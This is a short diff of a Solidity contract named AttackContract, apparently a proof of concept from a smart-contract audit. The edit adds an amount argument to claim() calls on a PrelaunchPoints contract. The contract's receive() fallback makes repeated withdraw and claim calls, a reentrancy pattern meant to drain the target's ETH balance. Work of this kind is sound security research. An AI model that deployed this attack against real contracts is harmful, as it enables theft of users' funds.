@@ -17,14 +17,14 @@ contract AttackContract {
     }
 
     function attackClaim() external {
-        prelaunchPoints.claim(ETH, PrelaunchPoints.Exchange.UniswapV3, emptydata);
+        prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
     }
 
     receive() external payable {
         if (address(prelaunchPoints).balance > 0) {
             prelaunchPoints.withdraw(ETH);
         } else {
-            prelaunchPoints.claim(ETH, PrelaunchPoints.Exchange.UniswapV3, emptydata);
+            prelaunchPoints.claim(ETH, 100, PrelaunchPoints.Exchange.UniswapV3, emptydata);
         }
     }
 }
